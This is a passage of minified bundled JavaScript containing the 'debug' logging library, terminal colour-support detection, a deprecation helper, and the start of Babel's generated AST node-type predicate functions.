K==="string"?K:"").trim().replace(/\s+/g,",").split(",").filter(Boolean);for(let q of Z)if(q[0]==="-")Q.skips.push(q.slice(1));else Q.names.push(q)}function G(K,Z){let q=0,B=0,M=-1,O=0;while(q<K.length)if(B<Z.length&&(Z[B]===K[q]||Z[B]==="*"))if(Z[B]==="*")M=B,O=q,B++;else q++,B++;else if(M!==-1)B=M+1,O++,q=O;else return!1;while(B<Z.length&&Z[B]==="*")B++;return B===Z.length}function H(){let K=[...Q.names,...Q.skips.map((Z)=>"-"+Z)].join(",");return Q.enable(""),K}function z(K){for(let Z of Q.skips)if(G(K,Z))return!1;for(let Z of Q.names)if(G(K,Z))return!0;return!1}function $(K){if(K instanceof Error)return K.stack||K.message;return K}function V(){console.warn("Instance method `debug.destroy()` is deprecated and no longer does anything. It will be removed in the next major version of `debug`.")}return Q.enable(Q.load()),Q}DV.exports=XT});var NV=v((wV,m5)=>{wV.formatArgs=QT;wV.save=YT;wV.load=WT;wV.useColors=JT;wV.storage=GT();wV.destroy=(()=>{let X=!1;return()=>{if(!X)X=!0,console.warn("Instance method `debug.destroy()` is deprecated and no longer does anything. It will be removed in the next major version of `debug`.")}})();wV.colors=["#0000CC","#0000FF","#0033CC","#0033FF","#0066CC","#0066FF","#0099CC","#0099FF","#00CC00","#00CC33","#00CC66","#00CC99","#00CCCC","#00CCFF","#3300CC","#3300FF","#3333CC","#3333FF","#3366CC","#3366FF","#3399CC","#3399FF","#33CC00","#33CC33","#33CC66","#33CC99","#33CCCC","#33CCFF","#6600CC","#6600FF","#6633CC","#6633FF","#66CC00","#66CC33","#9900CC","#9900FF","#9933CC","#9933FF","#99CC00","#99CC33","#CC0000","#CC0033","#CC0066","#CC0099","#CC00CC","#CC00FF","#CC3300","#CC3333","#CC3366","#CC3399","#CC33CC","#CC33FF","#CC6600","#CC6633","#CC9900","#CC9933","#CCCC00","#CCCC33","#FF0000","#FF0033","#FF0066","#FF0099","#FF00CC","#FF00FF","#FF3300","#FF3333","#FF3366","#FF3399","#FF33CC","#FF33FF","#FF6600","#FF6633","#FF9900","#FF9933","#FFCC00","#FFCC33"];function JT(){if(typeof window<"u"&&window.process&&(window.process.type==="renderer"||window.process.__nwjs))return!0;if(typeof navigator<"u"&&navigator.userAgent&&navigator.userAgent.toLowerCase().match(/(edge|trident)\/(\d+)/))return!1;let X;return typeof document<"u"&&document.documentElement&&document.documentElement.style&&document.documentElement.style.WebkitAppearance||typeof window<"u"&&window.console&&(window.console.firebug||window.console.exception&&window.console.table)||typeof navigator<"u"&&navigator.userAgent&&(X=navigator.userAgent.toLowerCase().match(/firefox\/(\d+)/))&&parseInt(X[1],10)>=31||typeof navigator<"u"&&navigator.userAgent&&navigator.userAgent.toLowerCase().match(/applewebkit\/(\d+)/)}function QT(X){if(X[0]=(this.useColors?"%c":"")+this.namespace+(this.useColors?" %c":" ")+X[0]+(this.useColors?"%c ":" ")+"+"+m5.exports.humanize(this.diff),!this.useColors)return;let J="color: "+this.color;X.splice(1,0,J,"color: inherit");let Q=0,Y=0;X[0].replace(/%[a-zA-Z%]/g,(W)=>{if(W==="%%")return;if(Q++,W==="%c")Y=Q}),X.splice(Y,0,J)}wV.log=console.debug||console.log||(()=>{});function YT(X){try{if(X)wV.storage.setItem("debug",X);else wV.storage.removeItem("debug")}catch(J){}}function WT(){let X;try{X=wV.storage.getItem("debug")||wV.storage.getItem("DEBUG")}catch(J){}if(!X&&typeof process<"u"&&"env"in process)X=process.env.DEBUG;return X}function GT(){try{return localStorage}catch(X){}}m5.exports=l2()(wV);var{formatters:HT}=m5.exports;HT.j=function(X){try{return JSON.stringify(X)}catch(J){return"[UnexpectedJSONParseError]: "+J.message}}});var IV=v((Wm1,LV)=>{LV.exports=(X,J=process.argv)=>{let Q=X.startsWith("-")?"":X.length===1?"-":"--",Y=J.indexOf(Q+X),W=J.indexOf("--");return Y!==-1&&(W===-1||Y<W)}});var SV=v((Gm1,PV)=>{var BT=Q0("os"),CV=Q0("tty"),L9=IV(),{env:_0}=process,GX;if(L9("no-color")||L9("no-colors")||L9("color=false")||L9("color=never"))GX=0;else if(L9("color")||L9("colors")||L9("color=true")||L9("color=always"))GX=1;if("FORCE_COLOR"in _0)if(_0.FORCE_COLOR==="true")GX=1;else if(_0.FORCE_COLOR==="false")GX=0;else GX=_0.FORCE_COLOR.length===0?1:Math.min(parseInt(_0.FORCE_COLOR,10),3);function p2(X){if(X===0)return!1;return{level:X,hasBasic:!0,has256:X>=2,has16m:X>=3}}function d2(X,J){if(GX===0)return 0;if(L9("color=16m")||L9("color=full")||L9("color=truecolor"))return 3;if(L9("color=256"))return 2;if(X&&!J&&GX===void 0)return 0;let Q=GX||0;if(_0.TERM==="dumb")return Q;if(process.platform==="win32"){let Y=BT.release().split(".");if(Number(Y[0])>=10&&Number(Y[2])>=10586)return Number(Y[2])>=14931?3:2;return 1}if("CI"in _0){if(["TRAVIS","CIRCLECI","APPVEYOR","GITLAB_CI","GITHUB_ACTIONS","BUILDKITE"].some((Y)=>(Y in _0))||_0.CI_NAME==="codeship")return 1;return Q}if("TEAMCITY_VERSION"in _0)return/^(9\.(0*[1-9]\d*)\.|\d{2,}\.)/.test(_0.TEAMCITY_VERSION)?1:0;if(_0.COLORTERM==="truecolor")return 3;if("TERM_PROGRAM"in _0){let Y=parseInt((_0.TERM_PROGRAM_VERSION||"").split(".")[0],10);switch(_0.TERM_PROGRAM){case"iTerm.app":return Y>=3?3:2;case"Apple_Terminal":return 2}}if(/-256(color)?$/i.test(_0.TERM))return 2;if(/^screen|^xterm|^vt100|^vt220|^rxvt|color|ansi|cygwin|linux/i.test(_0.TERM))return 1;if("COLORTERM"in _0)return 1;return Q}function MT(X){let J=d2(X,X&&X.isTTY);return p2(J)}PV.exports={supportsColor:MT,stdout:p2(d2(!0,CV.isatty(1))),stderr:p2(d2(!0,CV.isatty(2)))}});var kV=v((_V,c5)=>{var jT=Q0("tty"),u5=Q0("util");_V.init=NT;_V.log=AT;_V.formatArgs=FT;_V.save=DT;_V.load=wT;_V.useColors=OT;_V.destroy=u5.deprecate(()=>{},"Instance method `debug.destroy()` is deprecated and no longer does anything. It will be removed in the next major version of `debug`.");_V.colors=[6,2,3,4,5,1];try{let X=SV();if(X&&(X.stderr||X).level>=2)_V.colors=[20,21,26,27,32,33,38,39,40,41,42,43,44,45,56,57,62,63,68,69,74,75,76,77,78,79,80,81,92,93,98,99,112,113,128,129,134,135,148,149,160,161,162,163,164,165,166,167,168,169,170,171,172,173,178,179,184,185,196,197,198,199,200,201,202,203,204,205,206,207,208,209,214,215,220,221]}catch(X){}_V.inspectOpts=Object.keys(process.env).filter((X)=>{return/^debug_/i.test(X)}).reduce((X,J)=>{let Q=J.substring(6).toLowerCase().replace(/_([a-z])/g,(W,G)=>{return G.toUpperCase()}),Y=process.env[J];if(/^(yes|on|true|enabled)$/i.test(Y))Y=!0;else if(/^(no|off|false|disabled)$/i.test(Y))Y=!1;else if(Y==="null")Y=null;else Y=Number(Y);return X[Q]=Y,X},{});function OT(){return"colors"in _V.inspectOpts?Boolean(_V.inspectOpts.colors):jT.isatty(process.stderr.fd)}function FT(X){let{namespace:J,useColors:Q}=this;if(Q){let Y=this.color,W="\x1B[3"+(Y<8?Y:"8;5;"+Y),G=`  ${W};1m${J} \x1B[0m`;X[0]=G+X[0].split(`
`).join(`
`+G),X.push(W+"m+"+c5.exports.humanize(this.diff)+"\x1B[0m")}else X[0]=RT()+J+" "+X[0]}function RT(){if(_V.inspectOpts.hideDate)return"";return new Date().toISOString()+" "}function AT(...X){return process.stderr.write(u5.formatWithOptions(_V.inspectOpts,...X)+`
`)}function DT(X){if(X)process.env.DEBUG=X;else delete process.env.DEBUG}function wT(){return process.env.DEBUG}function NT(X){X.inspectOpts={};let J=Object.keys(_V.inspectOpts);for(let Q=0;Q<J.length;Q++)X.inspectOpts[J[Q]]=_V.inspectOpts[J[Q]]}c5.exports=l2()(_V);var{formatters:TV}=c5.exports;TV.o=function(X){return this.inspectOpts.colors=this.useColors,u5.inspect(X,this.inspectOpts).split(`
`).map((J)=>J.trim()).join(" ")};TV.O=function(X){return this.inspectOpts.colors=this.useColors,u5.inspect(X,this.inspectOpts)}});var bV=v((zm1,i2)=>{if(typeof process>"u"||process.type==="renderer"||!1||process.__nwjs)i2.exports=NV();else i2.exports=kV()});var l5=v((vV)=>{Object.defineProperty(vV,"__esModule",{value:!0});vV.default=ET;function ET(X,J){let Q=Object.keys(J);for(let Y of Q)if(X[Y]!==J[Y])return!1;return!0}});var m8=v((xV)=>{Object.defineProperty(xV,"__esModule",{value:!0});xV.default=bT;var fV=new Set;function bT(X,J,Q="",Y=X){if(fV.has(Y))return;fV.add(Y);let{internal:W,trace:G}=vT(1,2);if(W)return;console.warn(`${Q}\`${X}\` has been deprecated, please migrate to \`${J}\`
${G}`)}function vT(X,J){let{stackTraceLimit:Q,prepareStackTrace:Y}=Error,W;if(Error.stackTraceLimit=1+X+J,Error.prepareStackTrace=function(H,z){W=z},Error().stack,Error.stackTraceLimit=Q,Error.prepareStackTrace=Y,!W)return{internal:!1,trace:""};let G=W.slice(1+X,1+X+J);return{internal:/[\\/]@babel[\\/]/.test(G[1].getFileName()),trace:G.map((H)=>`    at ${H}`).join(`
`)}}});var F0=v((yV)=>{Object.defineProperty(yV,"__esModule",{value:!0});yV.isAccessor=ev;yV.isAnyTypeAnnotation=OE;yV.isArgumentPlaceholder=ik;yV.isArrayExpression=xT;yV.isArrayPattern=v_;yV.isArrayTypeAnnotation=FE;yV.isArrowFunctionExpression=f_;yV.isAssignmentExpression=hT;yV.isAssignmentPattern=b_;yV.isAwaitExpression=WE;yV.isBigIntLiteral=HE;yV.isBinary=Dv;yV.isBinaryExpression=yT;yV.isBindExpression=rk;yV.isBlock=Lv;yV.isBlockParent=Nv;yV.isBlockStatement=cT;yV.isBooleanLiteral=V_;yV.isBooleanLiteralTypeAnnotation=AE;yV.isBooleanTypeAnnotation=RE;yV.isBreakStatement=lT;yV.isCallExpression=pT;yV.isCatchClause=dT;yV.isClass=sv;yV.isClassAccessorProperty=UE;yV.isClassBody=x_;yV.isClassDeclaration=y_;yV.isClassExpression=h_;yV.isClassImplements=wE;yV.isClassMethod=s_;yV.isClassPrivateMethod=qE;yV.isClassPrivateProperty=ZE;yV.isClassProperty=KE;yV.isCompletionStatement=Pv;yV.isConditional=Sv;yV.isConditionalExpression=iT;yV.isContinueStatement=rT;yV.isDebuggerStatement=aT;yV.isDecimalLiteral=ek;yV.isDeclaration=hv;yV.isDeclareClass=NE;yV.isDeclareExportAllDeclaration=kE;yV.isDeclareExportDeclaration=EE;yV.isDeclareFunction=LE;yV.isDeclareInterface=IE;yV.isDeclareModule=CE;yV.isDeclareModuleExports=PE;yV.isDeclareOpaqueType=TE;yV.isDeclareTypeAlias=SE;yV.isDeclareVariable=_E;yV.isDeclaredPredicate=bE;yV.isDecorator=ak;yV.isDirective=mT;yV.isDirectiveLiteral=uT;yV.isDoExpression=nk;yV.isDoWhileStatement=nT;yV.isEmptyStatement=sT;yV.isEmptyTypeAnnotation=pE;yV.isEnumBody=Hf;yV.isEnumBooleanBody=Fk;yV.isEnumBooleanMember=wk;yV.isEnumDeclaration=Ok;yV.isEnumDefaultedMember=Ik;yV.isEnumMember=zf;yV.isEnumNumberBody=Rk;yV.isEnumNumberMember=Nk;yV.isEnumStringBody=Ak;yV.isEnumStringMember=Lk;yV.isEnumSymbolBody=Dk;yV.isExistsTypeAnnotation=vE;yV.isExportAllDeclaration=g_;yV.isExportDeclaration=ov;yV.isExportDefaultDeclaration=m_;yV.isExportDefaultSpecifier=sk;yV.isExportNamedDeclaration=u_;yV.isExportNamespaceSpecifier=zE;yV.isExportSpecifier=c_;yV.isExpression=Av;yV.isExpressionStatement=oT;yV.isExpressionWrapper=Ev;yV.isFile=tT;yV.isFlow=Jf;yV.isFlowBaseAnnotation=Yf;yV.isFlowDeclaration=Wf;yV.isFlowPredicate=Gf;yV.isFlowType=Qf;yV.isFor=kv;yV.isForInStatement=eT;yV.isForOfStatement=l_;yV.isForStatement=X_;yV.isForXStatement=bv;yV.isFunction=vv;yV.isFunctionDeclaration=J_;yV.isFunctionExpression=Q_;yV.isFunctionParameter=yv;yV.isFunctionParent=fv;yV.isFunctionTypeAnnotation=fE;yV.isFunctionTypeParam=xE;yV.isGenericTypeAnnotation=hE;yV.isIdentifier=Y_;yV.isIfStatement=W_;yV.isImmutable=lv;yV.isImport=GE;yV.isImportAttribute=jE;yV.isImportDeclaration=p_;yV.isImportDefaultSpecifier=d_;yV.isImportExpression=a_;yV.isImportNamespaceSpecifier=i_;yV.isImportOrExportDeclaration=hV;yV.isImportSpecifier=r_;yV.isIndexedAccessType=Ck;yV.isInferredPredicate=yE;yV.isInterfaceDeclaration=mE;yV.isInterfaceExtends=gE;yV.isInterfaceTypeAnnotation=uE;yV.isInterpreterDirective=gT;yV.isIntersectionTypeAnnotation=cE;yV.isJSX=$f;yV.isJSXAttribute=Sk;yV.isJSXClosingElement=Tk;yV.isJSXClosingFragment=ck;yV.isJSXElement=_k;yV.isJSXEmptyExpression=Ek;yV.isJSXExpressionContainer=kk;yV.isJSXFragment=mk;yV.isJSXIdentifier=vk;yV.isJSXMemberExpression=fk;yV.isJSXNamespacedName=xk;yV.isJSXOpeningElement=hk;yV.isJSXOpeningFragment=uk;yV.isJSXSpreadAttribute=yk;yV.isJSXSpreadChild=bk;yV.isJSXText=gk;yV.isLVal=mv;yV.isLabeledStatement=G_;yV.isLiteral=cv;yV.isLogicalExpression=U_;yV.isLoop=Tv;yV.isMemberExpression=Z_;yV.isMetaProperty=n_;yV.isMethod=dv;yV.isMiscellaneous=Vf;yV.isMixedTypeAnnotation=lE;yV.isModuleDeclaration=Ff;yV.isModuleExpression=Xb;yV.isModuleSpecifier=tv;yV.isNewExpression=q_;yV.isNoop=lk;yV.isNullLiteral=$_;yV.isNullLiteralTypeAnnotation=DE;yV.isNullableTypeAnnotation=dE;yV.isNumberLiteral=Bf;yV.isNumberLiteralTypeAnnotation=iE;yV.isNumberTypeAnnotation=rE;yV.isNumericLiteral=z_;yV.isObjectExpression=M_;yV.isObjectMember=iv;yV.isObjectMethod=j_;yV.isObjectPattern=o_;yV.isObjectProperty=O_;yV.isObjectTypeAnnotation=aE;yV.isObjectTypeCallProperty=sE;yV.isObjectTypeIndexer=oE;yV.isObjectTypeInternalSlot=nE;yV.isObjectTypeProperty=tE;yV.isObjectTypeSpreadProperty=eE;yV.isOpaqueType=Xk;yV.isOptionalCallExpression=VE;yV.isOptionalIndexedAccessType=Pk;yV.isOptionalMemberExpression=$E;yV.isParenthesizedExpression=D_;yV.isPattern=nv;yV.isPatternLike=gv;yV.isPipelineBareFunction=Yb;yV.isPipelinePrimaryTopicReference=Wb;yV.isPipelineTopicExpression=Qb;yV.isPlaceholder=pk;yV.isPrivate=Xf;yV.isPrivateName=BE;yV.isProgram=B_;yV.isProperty=rv;yV.isPureish=xv;yV.isQualifiedTypeIdentifier=Jk;yV.isRecordExpression=ok;yV.isRegExpLiteral=K_;yV.isRegexLiteral=Mf;yV.isRestElement=F_;yV.isRestProperty=jf;yV.isReturnStatement=R_;yV.isScopable=wv;yV.isSequenceExpression=A_;yV.isSpreadElement=t_;yV.isSpreadProperty=Of;yV.isStandardized=Rv;yV.isStatement=Iv;yV.isStaticBlock=ME;yV.isStringLiteral=H_;yV.isStringLiteralTypeAnnotation=Qk;yV.isStringTypeAnnotation=Yk;yV.isSuper=e_;yV.isSwitchCase=w_;yV.isSwitchStatement=N_;yV.isSymbolTypeAnnotation=Wk;yV.isTSAnyKeyword=Mb;yV.isTSArrayType=fb;yV.isTSAsExpression=Jv;yV.isTSBaseType=qf;yV.isTSBigIntKeyword=Ob;yV.isTSBooleanKeyword=jb;yV.isTSCallSignatureDeclaration=Kb;yV.isTSConditionalType=cb;yV.isTSConstructSignatureDeclaration=Ub;yV.isTSConstructorType=_b;yV.isTSDeclareFunction=zb;yV.isTSDeclareMethod=$b;yV.isTSEntityName=uv;yV.isTSEnumBody=Wv;yV.isTSEnumDeclaration=Gv;yV.isTSEnumMember=Hv;yV.isTSExportAssignment=qv;yV.isTSExpressionWithTypeArguments=sb;yV.isTSExternalModuleReference=Uv;yV.isTSFunctionType=Tb;yV.isTSImportEqualsDeclaration=Kv;yV.isTSImportType=Vv;yV.isTSIndexSignature=Bb;yV.isTSIndexedAccessType=ib;yV.isTSInferType=lb;yV.isTSInstantiationExpression=Xv;yV.isTSInterfaceBody=tb;yV.isTSInterfaceDeclaration=ob;yV.isTSIntersectionType=ub;yV.isTSIntrinsicKeyword=Fb;yV.isTSLiteralType=nb;yV.isTSMappedType=rb;yV.isTSMethodSignature=qb;yV.isTSModuleBlock=$v;yV.isTSModuleDeclaration=zv;yV.isTSNamedTupleMember=gb;yV.isTSNamespaceExportDeclaration=Bv;yV.isTSNeverKeyword=Rb;yV.isTSNonNullExpression=Zv;yV.isTSNullKeyword=Ab;yV.isTSNumberKeyword=Db;yV.isTSObjectKeyword=wb;yV.isTSOptionalType=hb;yV.isTSParameterProperty=Hb;yV.isTSParenthesizedType=pb;yV.isTSPropertySignature=Zb;yV.isTSQualifiedName=Vb;yV.isTSRestType=yb;yV.isTSSatisfiesExpression=Qv;yV.isTSStringKeyword=Nb;yV.isTSSymbolKeyword=Lb;yV.isTSTemplateLiteralType=ab;yV.isTSThisType=Sb;yV.isTSTupleType=xb;yV.isTSType=Zf;yV.isTSTypeAliasDeclaration=eb;yV.isTSTypeAnnotation=Mv;yV.isTSTypeAssertion=Yv;yV.isTSTypeElement=Uf;yV.isTSTypeLiteral=vb;yV.isTSTypeOperator=db;yV.isTSTypeParameter=Fv;yV.isTSTypeParameterDeclaration=Ov;yV.isTSTypeParameterInstantiation=jv;yV.isTSTypePredicate=kb;yV.isTSTypeQuery=bb;yV.isTSTypeReference=Eb;yV.isTSUndefinedKeyword=Ib;yV.isTSUnionType=mb;yV.isTSUnknownKeyword=Cb;yV.isTSVoidKeyword=Pb;yV.isTaggedTemplateExpression=XE;yV.isTemplateElement=JE;yV.isTemplateLiteral=QE;yV.isTerminatorless=Cv;yV.isThisExpression=L_;yV.isThisTypeAnnotation=Gk;yV.isThrowStatement=I_;yV.isTopicReference=Jb;yV.isTryStatement=C_;yV.isTupleExpression=tk;yV.isTupleTypeAnnotation=Hk;yV.isTypeAlias=$k;yV.isTypeAnnotation=Vk;yV.isTypeCastExpression=Kk;yV.isTypeParameter=Uk;yV.isTypeParameterDeclaration=Zk;yV.isTypeParameterInstantiation=qk;yV.isTypeScript=Kf;yV.isTypeofTypeAnnotation=zk;yV.isUnaryExpression=P_;yV.isUnaryLike=av;yV.isUnionTypeAnnotation=Bk;yV.isUpdateExpression=S_;yV.isUserWhitespacable=pv;yV.isV8IntrinsicIdentifier=dk;yV.isVariableDeclaration=T_;yV.isVariableDeclarator=__;yV.isVariance=Mk;yV.isVoidPattern=Gb;yV.isVoidTypeAnnotation=jk;yV.isWhile=_v;yV.isWhileStatement=E_;yV.isWithStatement=k_;yV.isYieldExpression=YE;var D=l5(),sJ=m8();function xT(X,J){if(!X)return!1;if(X.type!=="ArrayExpression")return!1;return J==null||(0,D.default)(X,J)}function hT(X,J){if(!X)return!1;if(X.type!=="AssignmentExpression")return!1;return J==null||(0,D.default)(X,J)}function yT(X,J){if(!X)return!1;if(X.type!=="BinaryExpression")return!1;return J==null||(0,D.default)(X,J)}function gT(X,J){if(!X)return!1;if(X.type!=="InterpreterDirective")return!1;return J==null||(0,D.default)(X,J)}function mT(X,J){if(!X)return!1;if(X.type!=="Directive")return!1;return J==null||(0,D.default)(X,J)}function uT(X,J){if(!X)return!1;if(X.type!=="DirectiveLiteral")return!1;return J==null||(0,D.default)(X,J)}function cT(X,J){if(!X)return!1;if(X.type!=="BlockStatement")return!1;return J==null||(0,D.default)(X,J)}function lT(X,J){if(!X)return!1;if(X.type!=="BreakStatement")return!1;return J==null||(0,D.default)(X,J)}function pT(X,J){if(!X)return!1;if(X.type!=="CallExpression")return!1;return J==null||(0,D.default)(X,J)}function dT(X,J){if(!X)return!1;if(X.type!=="CatchClause")return!1;return J==null||(0,D.default)(X,J)}function iT(X,J){if(!X)return!1;if(X.type!=="ConditionalExpression")return!1;return J==null||(0,D.default)(X,J)}function rT(X,J){if(!X)return!1;if(X.type!=="ContinueStatement")return!1;return J==null||(0,D.default)(X,J)}function aT(X,J){if(!X)return!1;if(X.type!=="DebuggerStatement")return!1;return J==null||(0,D.default)(X,J)}function nT(X,J){if(!X)return!1;if(X.type!=="DoWhileStatement")return!1;return J==null||(0,D.default)(X,J)}function sT(X,J){if(!X)return!1;if(X.type!=="EmptyStatement")return!1;return J==null||(0,D.default)(X,J)}function oT(X,J){if(!X)return!1;if(X.type!=="ExpressionStatement")return!1;return J==null||(0,D.default)(X,J)}function tT(X,J){if(!X)return!1;if(X.type!=="File")return!1;return J==null||(0,D.default)(X,J)}function eT(X,J){if(!X)return!1;if(X.type!=="ForInStatement")return!1;return J==null||(0,D.default)(X,J)}function X_(X,J){if(!X)return!1;if(X.type!=="ForStatement")return!1;return J==null||(0,D.default)(X,J)}function J_(X,J){if(!X)return!1;if(X.type!=="FunctionDeclaration")return!1;return J==null||(0,D.default)(X,J)}function Q_(X,J){if(!X)return!1;if(X.type!=="FunctionExpression")return!1;return J==null||(0,D.default)(X,J)}function Y_(X,J){if(!X)return!1;if(X.type!=="Identifier")return!1;return J==null||(0,D.default)(X,J)}function W_(X,J){if(!X)return!1;if(X.type!=="IfStatement")return!1;return J==null||(0,D.default)(X,J)}function G_(X,J){if(!X)return!1;if(X.type!=="LabeledStatement")return!1;return J==null||(0,D.default)(X,J)}function H_(X,J){if(!X)return!1;if(X.type!=="StringLiteral")return!1;return J==null||(0,D.default)(X,J)}function z_(X,J){if(!X)return!1;if(X.type!=="NumericLiteral")return!1;return J==null||(0,D.default)(X,J)}function $_(X,J){if(!X)return!1;if(X.type!=="NullLiteral")return!1;return J==null||(0,D.default)(X,J)}function V_(X,J){if(!X)return!1;if(X.type!=="BooleanLiteral")return!1;return J==null||(0,D.default)(X,J)}function K_(X,J){if(!X)return!1;if(X.type!=="RegExpLiteral")return!1;return J==null||(0,D.default)(X,J)}function U_(X,J){if(!X)return!1;if(X.type!=="LogicalExpression")return!1;return J==null||(0,D.default)(X,J)}function Z_(X,J){if(!X)return!1;if(X.type!=="MemberExpression")return!1;return J==null||(0,D.default)(X,J)}function q_(X,J){if(!X)return!1;if(X.type!=="NewExpression")return!1;return J==null||(0,D.default)(X,J)}function B_(X,J){if(!X)return!1;if(X.type!=="Program")return!1;return J==null||(0,D.default)(X,J)}function M_(X,J){if(!X)return!1;if(X.type!=="ObjectExpression")return!1;return J==null||(0,D.default)(X,J)}function j_(X,J){if(!X)return!1;if(X.type!=="ObjectMethod")return!1;return J==null||(0,D.default)(X,J)}function O_(X,J){if(!X)return!1;if(X.type!=="ObjectProperty")return!1;return J==null||(0,D.default)(X,J)}function F_(X,J){if(!X)return!1;if(X.type!=="RestElement")return!1;return J==null||(0,D.default)(X,J)}function R_(X,J){if(!X)return!1;if(X.type!=="ReturnStatement")return!1;return J==null||(0,D.default)(X,J)}function A_(X,J){if(!X)return!1;if(X.type!=="SequenceExpression")return!1;return J==null||(0,D.default)(X,J)}function D_(X,J){if(!X)return!1;if(X.type!=="ParenthesizedExpression")return!1;return J==null||(0,D.default)(X,J)}function w_(X,J){if(!X)return!1;if(X.type!=="SwitchCase")return!1;return J==null||(0,D.default)(X,J)}function N_(X,J){if(!X)return!1;if(X.type!=="SwitchStatement")return!1;return J==null||(0,D.default)(X,J)}function L_(X,J){if(!X)return!1;if(X.type!=="ThisExpression")return!1;return J==null||(0,D.default)(X,J)}function I_(X,J){if(!X)return!1;if(X.type!=="ThrowStatement")return!1;return J==null||(0,D.default)(X,J)}function C_(X,J){if(!X)return!1;if(X.type!=="TryStatement")return!1;return J==null||(0,D.default)(X,J)}function P_(X,J){if(!X)return!1;if(X.type!=="UnaryExpression")return!1;return J==null||(0,D.default)(X,J)}function S_(X,J){if(!X)return!1;if(X.type!=="UpdateExpression")return!1;return J==null||(0,D.default)(X,J)}function T_(X,J){if(!X)return!1;if(X.type!=="VariableDeclaration")return!1;return J==null||(0,D.default)(X,J)}function __(X,J){if(!X)return!1;if(X.type!=="VariableDeclarator")return!1;return J==null||(0,D.default)(X,J)}function E_(X,J){if(!X)return!1;if(X.type!=="WhileStatement")return!1;return J==null||(0,D.default)(X,J)}function k_(X,J){if(!X)return!1;if(X.type!=="WithStatement")return!1;return J==null||(0,D.default)(X,J)}function b_(X,J){if(!X)return!1;if(X.type!=="AssignmentPattern")return!1;return J==null||(0,D.default)(X,J)}function v_(X,J){if(!X)return!1;if(X.type!=="ArrayPattern")return!1;return J==null||(0,D.default)(X,J)}function f_(X,J){if(!X)return!1;if(X.type!=="ArrowFunctionExpression")return!1;return J==null||(0,D.default)(X,J)}function x_(X,J){if(!X)return!1;if(X.type!=="ClassBody")return!1;return J==null||(0,D.default)(X,J)}function h_(X,J){if(!X)return!1;if(X.type!=="ClassExpression")return!1;return J==null||(0,D.default)(X,J)}function y_(X,J){if(!X)return!1;if(X.type!=="ClassDeclaration")return!1;return J==null||(0,D.default)(X,J)}function g_(X,J){if(!X)return!1;if(X.type!=="ExportAllDeclaration")return!1;return J==null||(0,D.default)(X,J)}function m_(X,J){if(!X)return!1;if(X.type!=="ExportDefaultDeclaration")return!1;return J==null||(0,D.default)(X,J)}function u_(X,J){if(!X)return!1;if(X.type!=="ExportNamedDeclaration")return!1;return J==null||(0,D.default)(X,J)}function c_(X,J){if(!X)return!1;if(X.type!=="ExportSpecifier")return!1;return J==null||(0,D.default)(X,J)}function l_(X,J){if(!X)return!1;if(X.type!=="ForOfStatement")return!1;return J==null||(0,D.default)(X,J)}function p_(X,J){if(!X)return!1;if(X.type!=="ImportDeclaration")return!1;return J==null||(0,D.default)(X,J)}function d_(X,J){if(!X)return!1;if(X.type!=="ImportDefaultSpecifier")return!1;return J==null||(0,D.default)(X,J)}function i_(X,J){if(!X)return!1;if(X.type!=="ImportNamespaceSpecifier")return!1;return J==null||(0,D.default)(X,J)}function r_(X,J){if(!X)return!1;if(X.type!=="ImportSpecifier")return!1;return J==null||(0,D.default)(X,J)}function a_(X,J){if(!X)return!1;if(X.type!=="ImportExpression")return!1;return J==null||(0,D.default)(X,J)}function n_(X,J){if(!X)return!1;if(X.type!=="MetaProperty")return!1;return J==null||(0,D.default)(X,J)}function s_(X,J){if(!X)return!1;if(X.type!=="ClassMethod")return!1;return J==null||(0,D.default)(X,J)}function o_(X,J){if(!X)return!1;if(X.type!=="ObjectPattern")return!1;return J==null||(0,D.default)(X,J)}function t_(X,J){if(!X)return!1;if(X.type!=="SpreadElement")return!1;return J==null||(0,D.default)(X,J)}function e_(X,J){if(!X)return!1;if(X.type!=="Super")return!1;return J==null||(0,D.default)(X,J)}function XE(X,J){if(!X)return!1;if(X.type!=="TaggedTemplateExpression")return!1;return J==null||(0,D.default)(X,J)}function JE(X,J){if(!X)return!1;if(X.type!=="TemplateElement")return!1;return J==null||(0,D.default)(X,J)}function QE(X,J){if(!X)return!1;if(X.type!=="TemplateLiteral")return!1;return J==null||(0,D.default)(X,J)}function YE(X,J){if(!X)return!1;if(X.type!=="YieldExpression")return!1;return J==null||(0,D.default)(X,J)}function WE(X,J){if(!X)return!1;if(X.type!=="AwaitExpression")return!1;return J==null||(0,D.default)(X,J)}function GE(X,J){if(!X)return!1;if(X.type!=="Import")return!1;return J==null||(0,D.default)(X,J)}function HE(X,J){if(!X)return!1;if(X.type!=="BigIntLiteral")return!1;return J==null||(0,D.default)(X,J)}function zE(X,J){if(!X)return!1;if(X.type!=="ExportNamespaceSpecifier")return!1;return J==null||(0,D.default)(X,J)}function $E(X,J){if(!X)return!1;if(X.type!=="OptionalMemberExpression")return!1;return J==null||(0,D.default)(X,J)}function VE(X,J){if(!X)return!1;if(X.type!=="OptionalCallExpression")return!1;return J==null||(0,D.default)(X,J)}function KE(X,J){if(!X)return!1;if(X.type!=="ClassProperty")return!1;return J==null||(0,D.default)(X,J)}function UE(X,J){if(!X)return!1;if(X.type!=="ClassAccessorProperty")return!1;return J==null||(0,D.default)(X,J)}function ZE(X,J){if(!X)return!1;if(X.type!=="ClassPrivateProperty")return!1;return J==null||(0,D.default)(X,J)}function qE(X,J){if(!X)return!1;if(X.type!=="ClassPrivateMethod")return!1;return J==null||(0,D.default)(X,J)}function BE(X,J){if(!X)return!1;if(X.type!=="PrivateName")return!1;return J==null||(0,D.default)(X,J)}function ME(X,J){if(!X)return!1;if(X.type!=="StaticBlock")return!1;return J==null||(0,D.default)(X,J)}function jE(X,J){if(!X)return!1;if(X.type!=="ImportAttribute")return!1;return J==null||(0,D.default)(X,J)}function OE(X,J){if(!X)return!1;if(X.type!=="AnyTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function FE(X,J){if(!X)return!1;if(X.type!=="ArrayTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function RE(X,J){if(!X)return!1;if(X.type!=="BooleanTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function AE(X,J){if(!X)return!1;if(X.type!=="BooleanLiteralTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function DE(X,J){if(!X)return!1;if(X.type!=="NullLiteralTypeAnnotation")return!1;return J==null||(0,D.default)(X,J)}function wE(X,J){if(!X)return!1;if(X.type!=="ClassImplements")return!1;return J==null||(0,D.default)(X,J)}function NE(X,J){if(!X)return!1;if(X.type!=="DeclareClass")return!1;return J==null||(0,D.default)(X,J)}function 